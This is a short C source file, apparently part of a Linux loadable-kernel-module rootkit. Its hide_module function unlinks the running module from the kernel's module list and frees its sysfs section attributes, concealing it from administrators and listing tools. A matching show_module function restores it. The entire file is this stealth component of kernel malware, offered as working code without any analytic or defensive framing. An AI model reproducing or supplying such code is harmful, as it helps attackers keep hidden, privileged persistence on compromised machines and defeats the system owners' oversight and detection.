#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/module.h>

#include "include/module.h"

static DEFINE_MUTEX(module_mutex);
static struct list_head *module_list;

void hide_module(void) {
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	module_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
}

void show_module(void) {
	while (!mutex_trylock(&module_mutex)) {
		cpu_relax();
	}

	list_add(&THIS_MODULE->list, module_list);
	mutex_unlock(&module_mutex);
}
